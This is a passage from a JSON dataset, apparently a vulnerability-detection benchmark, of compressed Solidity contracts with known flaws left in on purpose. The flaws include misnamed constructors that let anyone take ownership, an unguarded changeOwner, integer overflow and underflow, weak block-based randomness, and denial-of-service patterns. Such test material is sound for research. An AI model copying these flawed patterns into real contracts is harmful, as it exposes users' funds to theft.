      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 17,
        "transformed_lines": 13,
        "original_chars": 252,
        "transformed_chars": 177,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_125",
      "transformed_id": "ss_l1_compressed_sn_ds_125",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Missing{\naddress private owner;\nmodifier onlyowner {\nrequire(msg.sender==owner);\n_;\n}\nfunction IamMissing()\npublic {\nowner = msg.sender;\n}\nfunction () payable {}\nfunction withdraw()\npublic\nonlyowner {\nowner.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 28,
        "transformed_lines": 18,
        "original_chars": 454,
        "transformed_chars": 268,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_ds_126",
      "transformed_id": "ss_l1_compressed_sn_ds_126",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Missing{\naddress private owner;\nmodifier onlyowner {\nrequire(msg.sender==owner);\n_;\n}\nfunction missing()\npublic {\nowner = msg.sender;\n}\nfunction () payable {}\nfunction withdraw()\npublic\nonlyowner {\nowner.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 25,
        "transformed_lines": 18,
        "original_chars": 396,
        "transformed_chars": 265,
        "compression_ratio": 0.67
      },
      "error": null
    },
    {
      "original_id": "sn_ds_127",
      "transformed_id": "ss_l1_compressed_sn_ds_127",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Missing{\naddress private owner;\nmodifier onlyowner {\nrequire(msg.sender==owner);\n_;\n}\nfunction Constructor()\npublic {\nowner = msg.sender;\n}\nfunction () payable {}\nfunction withdraw()\npublic\nonlyowner {\nowner.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 26,
        "transformed_lines": 18,
        "original_chars": 401,
        "transformed_chars": 269,
        "compression_ratio": 0.67
      },
      "error": null
    },
    {
      "original_id": "sn_ds_128",
      "transformed_id": "ss_l1_compressed_sn_ds_128",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract MultiOwnable {\naddress public root;\nmapping (address => address) public owners;\nconstructor() public {\nroot = msg.sender;\nowners[root] = root;\n}\nmodifier onlyOwner() {\nrequire(owners[msg.sender] != 0);\n_;\n}\nfunction newOwner(address _owner) external returns (bool) {\nrequire(_owner != 0);\nowners[_owner] = msg.sender;\nreturn true;\n}\nfunction deleteOwner(address _owner) onlyOwner external returns (bool) {\nrequire(owners[_owner] == msg.sender || (owners[_owner] != 0 && msg.sender == root));\nowners[_owner] = 0;\nreturn true;\n}\n}\ncontract TestContract is MultiOwnable {\nfunction withdrawAll() onlyOwner {\nmsg.sender.transfer(this.balance);\n}\nfunction() payable {\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 11,
        "mode": "compressed",
        "original_lines": 41,
        "transformed_lines": 30,
        "original_chars": 841,
        "transformed_chars": 699,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_ds_129",
      "transformed_id": "ss_l1_compressed_sn_ds_129",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Rubixi {\nuint private balance = 0;\nuint private collectedFees = 0;\nuint private feePercent = 10;\nuint private pyramidMultiplier = 300;\nuint private payoutOrder = 0;\naddress private creator;\nfunction DynamicPyramid() {\ncreator = msg.sender;\n}\nmodifier onlyowner {\nif (msg.sender == creator) _;\n}\nstruct Participant {\naddress etherAddress;\nuint payout;\n}\nParticipant[] private participants;\nfunction() {\ninit();\n}\nfunction init() private {\nif (msg.value < 1 ether) {\ncollectedFees += msg.value;\nreturn;\n}\nuint _fee = feePercent;\nif (msg.value >= 50 ether) _fee /= 2;\naddPayout(_fee);\n}\nfunction addPayout(uint _fee) private {\nparticipants.push(Participant(msg.sender, (msg.value * pyramidMultiplier) / 100));\nif (participants.length == 10) pyramidMultiplier = 200;\nelse if (participants.length == 25) pyramidMultiplier = 150;\nbalance += (msg.value * (100 - _fee)) / 100;\ncollectedFees += (msg.value * _fee) / 100;\nwhile (balance > participants[payoutOrder].payout) {\nuint payoutToSend = participants[payoutOrder].payout;\nparticipants[payoutOrder].etherAddress.send(payoutToSend);\nbalance -= participants[payoutOrder].payout;\npayoutOrder += 1;\n}\n}\nfunction collectAllFees() onlyowner {\nif (collectedFees == 0) throw;\ncreator.send(collectedFees);\ncollectedFees = 0;\n}\nfunction collectFeesInEther(uint _amt) onlyowner {\n_amt *= 1 ether;\nif (_amt > collectedFees) collectAllFees();\nif (collectedFees == 0) throw;\ncreator.send(_amt);\ncollectedFees -= _amt;\n}\nfunction collectPercentOfFees(uint _pcent) onlyowner {\nif (collectedFees == 0 || _pcent > 100) throw;\nuint feesToCollect = collectedFees / 100 * _pcent;\ncreator.send(feesToCollect);\ncollectedFees -= feesToCollect;\n}\nfunction changeOwner(address _owner) onlyowner {\ncreator = _owner;\n}\nfunction changeMultiplier(uint _mult) onlyowner {\nif (_mult > 300 || _mult < 120) throw;\npyramidMultiplier = _mult;\n}\nfunction changeFeePercentage(uint _fee) onlyowner {\nif (_fee > 10) throw;\nfeePercent = _fee;\n}\nfunction currentMultiplier() constant returns(uint multiplier, string info) {\nmultiplier = pyramidMultiplier;\ninfo = 'This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.';\n}\nfunction currentFeePercentage() constant returns(uint fee, string info) {\nfee = feePercent;\ninfo = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';\n}\nfunction currentPyramidBalanceApproximately() constant returns(uint pyramidBalance, string info) {\npyramidBalance = balance / 1 ether;\ninfo = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n}\nfunction nextPayoutWhenPyramidBalanceTotalsApproximately() constant returns(uint balancePayout) {\nbalancePayout = participants[payoutOrder].payout / 1 ether;\n}\nfunction feesSeperateFromBalanceApproximately() constant returns(uint fees) {\nfees = collectedFees / 1 ether;\n}\nfunction totalParticipants() constant returns(uint count) {\ncount = participants.length;\n}\nfunction numberOfParticipantsWaitingForPayout() constant returns(uint count) {\ncount = participants.length - payoutOrder;\n}\nfunction participantDetails(uint orderInPyramid) constant returns(address Address, uint Payout) {\nif (orderInPyramid <= participants.length) {\nAddress = participants[orderInPyramid].etherAddress;\nPayout = participants[orderInPyramid].payout / 1 ether;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 40,
        "mode": "compressed",
        "original_lines": 155,
        "transformed_lines": 104,
        "original_chars": 6074,
        "transformed_chars": 3725,
        "compression_ratio": 0.61
      },
      "error": null
    },
    {
      "original_id": "sn_ds_130",
      "transformed_id": "ss_l1_compressed_sn_ds_130",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract OpenAccess{\naddress private owner;\nmodifier onlyowner {\nrequire(msg.sender==owner);\n_;\n}\nfunction OpenAccess()\npublic {\nowner = msg.sender;\n}\nfunction changeOwner(address _newOwner)\npublic {\nowner = _newOwner;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 25,
        "transformed_lines": 16,
        "original_chars": 426,
        "transformed_chars": 247,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_ds_131",
      "transformed_id": "ss_l1_compressed_sn_ds_131",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.10;\ncontract AdditionCounter {\nmapping (address => uint256) public balanceOf;\nfunction transfer(address _to, uint256 _value) public{\nrequire(balanceOf[msg.sender] >= _value);\nbalanceOf[msg.sender] -= _value;\nbalanceOf[_to] += _value;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 9,
        "original_chars": 367,
        "transformed_chars": 258,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_132",
      "transformed_id": "ss_l1_compressed_sn_ds_132",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Ledger {\nuint private sellerBalance=0;\nfunction add(uint value) returns (bool){\nsellerBalance += value;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 18,
        "transformed_lines": 7,
        "original_chars": 426,
        "transformed_chars": 141,
        "compression_ratio": 0.33
      },
      "error": null
    },
    {
      "original_id": "sn_ds_133",
      "transformed_id": "ss_l1_compressed_sn_ds_133",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract AdditionCounter {\nuint public count = 1;\nfunction run(uint256 input) public {\ncount += input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 12,
        "transformed_lines": 7,
        "original_chars": 156,
        "transformed_chars": 131,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_ds_134",
      "transformed_id": "ss_l1_compressed_sn_ds_134",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract BenignCounter {\nuint public count = 1;\nfunction run(uint256 input) public {\nuint res = count - input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 12,
        "transformed_lines": 7,
        "original_chars": 164,
        "transformed_chars": 139,
        "compression_ratio": 0.85
      },
      "error": null
    },
    {
      "original_id": "sn_ds_135",
      "transformed_id": "ss_l1_compressed_sn_ds_135",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.11;\ncontract MappingCounter {\nmapping(uint256 => uint256) map;\nfunction init(uint256 k, uint256 v) public {\nmap[k] -= v;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 10,
        "transformed_lines": 7,
        "original_chars": 168,
        "transformed_chars": 145,
        "compression_ratio": 0.86
      },
      "error": null
    },
    {
      "original_id": "sn_ds_136",
      "transformed_id": "ss_l1_compressed_sn_ds_136",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract MinimalCounter {\nuint public count = 1;\nfunction run(uint256 input) public {\ncount -= input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 12,
        "transformed_lines": 7,
        "original_chars": 155,
        "transformed_chars": 130,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_ds_137",
      "transformed_id": "ss_l1_compressed_sn_ds_137",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract MultiplyCounter {\nuint public count = 2;\nfunction run(uint256 input) public {\ncount *= input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 12,
        "transformed_lines": 7,
        "original_chars": 156,
        "transformed_chars": 131,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_ds_138",
      "transformed_id": "ss_l1_compressed_sn_ds_138",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract MultiTxCalculator {\nuint256 private initialized = 0;\nuint256 public count = 1;\nfunction init() public {\ninitialized = 1;\n}\nfunction run(uint256 input) {\nif (initialized == 0) {\nreturn;\n}\ncount -= input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 20,
        "transformed_lines": 14,
        "original_chars": 348,
        "transformed_chars": 240,
        "compression_ratio": 0.69
      },
      "error": null
    },
    {
      "original_id": "sn_ds_139",
      "transformed_id": "ss_l1_compressed_sn_ds_139",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract SingleFuncCalculator {\nuint256 private initialized = 0;\nuint256 public count = 1;\nfunction run(uint256 input) public {\nif (initialized == 0) {\ninitialized = 1;\nreturn;\n}\ncount -= input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 17,
        "transformed_lines": 12,
        "original_chars": 326,
        "transformed_chars": 223,
        "compression_ratio": 0.68
      },
      "error": null
    },
    {
      "original_id": "sn_ds_140",
      "transformed_id": "ss_l1_compressed_sn_ds_140",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity 0.4.25;\ncontract AdditionLedger {\nuint public balance = 1;\nfunction add(uint256 deposit) public {\nbalance += deposit;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 10,
        "transformed_lines": 7,
        "original_chars": 191,
        "transformed_chars": 137,
        "compression_ratio": 0.72
      },
      "error": null
    },
    {
      "original_id": "sn_ds_141",
      "transformed_id": "ss_l1_compressed_sn_ds_141",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.23;\ncontract SingleTxCounter {\nuint public count = 1;\nfunction addtostate(uint256 input) public {\ncount += input;\n}\nfunction multostate(uint256 input) public {\ncount *= input;\n}\nfunction underflowtostate(uint256 input) public {\ncount -= input;\n}\nfunction localcalc(uint256 input) public {\nuint res = count + input;\n}\nfunction mullocalonly(uint256 input) public {\nuint res = count * input;\n}\nfunction underflowlocalonly(uint256 input) public {\nuint res = count - input;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 11,
        "mode": "compressed",
        "original_lines": 33,
        "transformed_lines": 22,
        "original_chars": 604,
        "transformed_chars": 493,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_ds_142",
      "transformed_id": "ss_l1_compressed_sn_ds_142",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.10;\ncontract TimeLock {\nmapping(address => uint) public balances;\nmapping(address => uint) public lockTime;\nfunction deposit() public payable {\nbalances[msg.sender] += msg.value;\nlockTime[msg.sender] = now + 1 weeks;\n}\nfunction increaseLockTime(uint _secondsToIncrease) public {\nlockTime[msg.sender] += _secondsToIncrease;\n}\nfunction withdraw() public {\nrequire(balances[msg.sender] > 0);\nrequire(now > lockTime[msg.sender]);\nuint transferValue = balances[msg.sender];\nbalances[msg.sender] = 0;\nmsg.sender.transfer(transferValue);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 25,
        "transformed_lines": 19,
        "original_chars": 676,
        "transformed_chars": 555,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_ds_143",
      "transformed_id": "ss_l1_compressed_sn_ds_143",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract Token {\nmapping(address => uint) balances;\nuint public totalSupply;\nfunction Token(uint _initialSupply) {\nbalances[msg.sender] = totalSupply = _initialSupply;\n}\nfunction transfer(address _to, uint _value) public returns (bool) {\nrequire(balances[msg.sender] - _value >= 0);\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nreturn true;\n}\nfunction balanceOf(address _owner) public constant returns (uint balance) {\nreturn balances[_owner];\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 23,
        "transformed_lines": 17,
        "original_chars": 577,
        "transformed_chars": 484,
        "compression_ratio": 0.84
      },
      "error": null
    },
    {
      "original_id": "sn_ds_144",
      "transformed_id": "ss_l1_compressed_sn_ds_144",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.21;\ncontract TokenSaleChallenge {\nmapping(address => uint256) public balanceOf;\nuint256 constant PRICE_PER_TOKEN = 1 ether;\nfunction TokenSaleChallenge(address _player) public payable {\nrequire(msg.value == 1 ether);\n}\nfunction isComplete() public view returns (bool) {\nreturn address(this).balance < 1 ether;\n}\nfunction buy(uint256 numTokens) public payable {\nrequire(msg.value == numTokens * PRICE_PER_TOKEN);\nbalanceOf[msg.sender] += numTokens;\n}\nfunction sell(uint256 numTokens) public {\nrequire(balanceOf[msg.sender] >= numTokens);\nbalanceOf[msg.sender] -= numTokens;\nmsg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 27,
        "transformed_lines": 20,
        "original_chars": 781,
        "transformed_chars": 647,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_ds_145",
      "transformed_id": "ss_l1_compressed_sn_ds_145",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.16;\ncontract Ethraffle_v4b {\nstruct Contestant {\naddress addr;\nuint raffleId;\n}\nevent RaffleResult(\nuint raffleId,\nuint winningNumber,\naddress winningAddress,\naddress seed1,\naddress seed2,\nuint seed3,\nbytes32 randHash\n);\nevent TicketPurchase(\nuint raffleId,\naddress contestant,\nuint number\n);\nevent TicketRefund(\nuint raffleId,\naddress contestant,\nuint number\n);\nuint public constant prize = 2.5 ether;\nuint public constant fee = 0.03 ether;\nuint public constant totalTickets = 50;\nuint public constant pricePerTicket = (prize + fee) / totalTickets;\naddress feeAddress;\nbool public paused = false;\nuint public raffleId = 1;\nuint public blockNumber = block.number;\nuint nextTicket = 0;\nmapping (uint => Contestant) contestants;\nuint[] gaps;\nfunction Ethraffle_v4b() public {\nfeeAddress = msg.sender;\n}\nfunction () payable public {\nbuyTickets();\n}\nfunction buyTickets() payable public {\nif (paused) {\nmsg.sender.transfer(msg.value);\nreturn;\n}\nuint moneySent = msg.value;\nwhile (moneySent >= pricePerTicket && nextTicket < totalTickets) {\nuint currTicket = 0;\nif (gaps.length > 0) {\ncurrTicket = gaps[gaps.length-1];\ngaps.length--;\n} else {\ncurrTicket = nextTicket++;\n}\ncontestants[currTicket] = Contestant(msg.sender, raffleId);\nTicketPurchase(raffleId, msg.sender, currTicket);\nmoneySent -= pricePerTicket;\n}\nif (nextTicket == totalTickets) {\nchooseWinner();\n}\nif (moneySent > 0) {\nmsg.sender.transfer(moneySent);\n}\n}\nfunction chooseWinner() private {\naddress seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\naddress seed2 = contestants[uint(msg.sender) % totalTickets].addr;\nuint seed3 = block.difficulty;\nbytes32 randHash = keccak256(seed1, seed2, seed3);\nuint winningNumber = uint(randHash) % totalTickets;\naddress winningAddress = contestants[winningNumber].addr;\nRaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\nraffleId++;\nnextTicket = 0;\nblockNumber = block.number;\nwinningAddress.transfer(prize);\nfeeAddress.transfer(fee);\n}\nfunction getRefund() public {\nuint refund = 0;\nfor (uint i = 0; i < totalTickets; i++) {\nif (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\nrefund += pricePerTicket;\ncontestants[i] = Contestant(address(0), 0);\ngaps.push(i);\nTicketRefund(raffleId, msg.sender, i);\n}\n}\nif (refund > 0) {\nmsg.sender.transfer(refund);\n}\n}\nfunction endRaffle() public {\nif (msg.sender == feeAddress) {\npaused = true;\nfor (uint i = 0; i < totalTickets; i++) {\nif (raffleId == contestants[i].raffleId) {\nTicketRefund(raffleId, contestants[i].addr, i);\ncontestants[i].addr.transfer(pricePerTicket);\n}\n}\nRaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\nraffleId++;\nnextTicket = 0;\nblockNumber = block.number;\ngaps.length = 0;\n}\n}\nfunction togglePause() public {\nif (msg.sender == feeAddress) {\npaused = !paused;\n}\n}\nfunction kill() public {\nif (msg.sender == feeAddress) {\nselfdestruct(feeAddress);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 26,
        "mode": "compressed",
        "original_lines": 162,
        "transformed_lines": 122,
        "original_chars": 4589,
        "transformed_chars": 2942,
        "compression_ratio": 0.64
      },
      "error": null
    },
    {
      "original_id": "sn_ds_146",
      "transformed_id": "ss_l1_compressed_sn_ds_146",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.21;\ncontract GuessTheRandomNumberChallenge {\nuint8 answer;\nfunction GuessTheRandomNumberChallenge() public payable {\nrequire(msg.value == 1 ether);\nanswer = uint8(keccak256(block.blockhash(block.number - 1), now));\n}\nfunction isComplete() public view returns (bool) {\nreturn address(this).balance == 0;\n}\nfunction guess(uint8 n) public payable {\nrequire(msg.value == 1 ether);\nif (n == answer) {\nmsg.sender.transfer(2 ether);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 23,
        "transformed_lines": 17,
        "original_chars": 577,
        "transformed_chars": 452,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_147",
      "transformed_id": "ss_l1_compressed_sn_ds_147",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract Lottery {\nevent GetBet(uint betAmount, uint blockNumber, bool won);\nstruct Bet {\nuint betAmount;\nuint blockNumber;\nbool won;\n}\naddress private organizer;\nBet[] private bets;\nfunction Lottery() {\norganizer = msg.sender;\n}\nfunction() {\nthrow;\n}\nfunction makeBet() {\nbool won = (block.number % 2) == 0;\nbets.push(Bet(msg.value, block.number, won));\nif(won) {\nif(!msg.sender.send(msg.value)) {\nthrow;\n}\n}\n}\nfunction getBets() {\nif(msg.sender != organizer) { throw; }\nfor (uint i = 0; i < bets.length; i++) {\nGetBet(bets[i].betAmount, bets[i].blockNumber, bets[i].won);\n}\n}\nfunction destroy() {\nif(msg.sender != organizer) { throw; }\nsuicide(organizer);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 58,
        "transformed_lines": 36,
        "original_chars": 1307,
        "transformed_chars": 685,
        "compression_ratio": 0.52
      },
      "error": null
    },
    {
      "original_id": "sn_ds_148",
      "transformed_id": "ss_l1_compressed_sn_ds_148",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract PredictTheBlockHashChallenge {\nstruct guess{\nuint block;\nbytes32 guess;\n}\nmapping(address => guess) guesses;\nconstructor() public payable {\nrequire(msg.value == 1 ether);\n}\nfunction lockInGuess(bytes32 hash) public payable {\nrequire(guesses[msg.sender].block == 0);\nrequire(msg.value == 1 ether);\nguesses[msg.sender].guess = hash;\nguesses[msg.sender].block = block.number + 1;\n}\nfunction settle() public {\nrequire(block.number > guesses[msg.sender].block);\nbytes32 answer = blockhash(guesses[msg.sender].block);\nguesses[msg.sender].block = 0;\nif (guesses[msg.sender].guess == answer) {\nmsg.sender.transfer(2 ether);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 9,
        "mode": "compressed",
        "original_lines": 35,
        "transformed_lines": 25,
        "original_chars": 1031,
        "transformed_chars": 655,
        "compression_ratio": 0.64
      },
      "error": null
    },
    {
      "original_id": "sn_ds_149",
      "transformed_id": "ss_l1_compressed_sn_ds_149",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract RandomNumberGenerator {\nuint256 private salt = block.timestamp;\nfunction random(uint max) view private returns (uint256 result) {\nuint256 x = salt * 100 / max;\nuint256 y = salt * block.number / (salt % 5);\nuint256 seed = block.number / 3 + (salt % 300) + y;\nuint256 h = uint256(blockhash(seed));\nreturn uint256((h / x)) % max + 1;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 17,
        "transformed_lines": 11,
        "original_chars": 592,
        "transformed_chars": 368,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_150",
      "transformed_id": "ss_l1_compressed_sn_ds_150",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract SimpleAuction {\naddress currentFrontrunner;\nuint currentBid;\nfunction bid() payable {\nrequire(msg.value > currentBid);\nif (currentFrontrunner != 0) {\nrequire(currentFrontrunner.send(currentBid));\n}\ncurrentFrontrunner = msg.sender;\ncurrentBid = msg.value;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 21,
        "transformed_lines": 13,
        "original_chars": 492,
        "transformed_chars": 292,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_ds_151",
      "transformed_id": "ss_l1_compressed_sn_ds_151",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract GasAuction {\naddress[] creditorAddresses;\nbool win = false;\nfunction emptyCreditors() public {\nif(creditorAddresses.length>1500) {\ncreditorAddresses = new address[](0);\nwin = true;\n}\n}\nfunction addCreditors() public returns (bool) {\nfor(uint i=0;i<350;i++) {\ncreditorAddresses.push(msg.sender);\n}\nreturn true;\n}\nfunction iWin() public view returns (bool) {\nreturn win;\n}\nfunction numberCreditors() public view returns (uint) {\nreturn creditorAddresses.length;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 30,
        "transformed_lines": 23,
        "original_chars": 665,
        "transformed_chars": 497,
        "compression_ratio": 0.75
      },
      "error": null
    },
    {
      "original_id": "sn_ds_152",
      "transformed_id": "ss_l1_compressed_sn_ds_152",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract NumberRegistry {\nuint numElements = 0;\nuint[] array;\nfunction insertNnumbers(uint value,uint numbers) public {\nfor(uint i=0;i<numbers;i++) {\nif(numElements == array.length) {\narray.length += 1;\n}\narray[numElements++] = value;\n}\n}\nfunction clear() public {\nrequire(numElements>1500);\nnumElements = 0;\n}\nfunction clearDOS() public {\nrequire(numElements>1500);\narray = new uint[](0);\nnumElements = 0;\n}\nfunction getLengthArray() public view returns(uint) {\nreturn numElements;\n}\nfunction getRealLengthArray() public view returns(uint) {\nreturn array.length;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 10,
        "mode": "compressed",
        "original_lines": 39,
        "transformed_lines": 28,
        "original_chars": 851,
        "transformed_chars": 592,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_153",
      "transformed_id": "ss_l1_compressed_sn_ds_153",
      "level": "l1",
